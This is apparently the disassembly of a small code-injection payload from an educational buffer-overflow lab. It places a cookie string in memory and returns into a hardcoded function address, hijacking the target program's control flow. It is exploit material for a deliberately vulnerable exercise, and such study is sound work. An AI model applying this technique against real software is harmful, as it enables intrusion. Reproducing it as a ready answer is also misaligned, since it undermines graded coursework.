
inject.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 b9 35 39 62 39 39 	movabs $0x6166373939623935,%rcx
   7:	37 66 61 
   a:	48 89 0f             	mov    %rcx,(%rdi)
   d:	48 c7 c1 00 00 00 00 	mov    $0x0,%rcx
  14:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
  18:	68 fa 18 40 00       	pushq  $0x4018fa
  1d:	c3                   	retq   
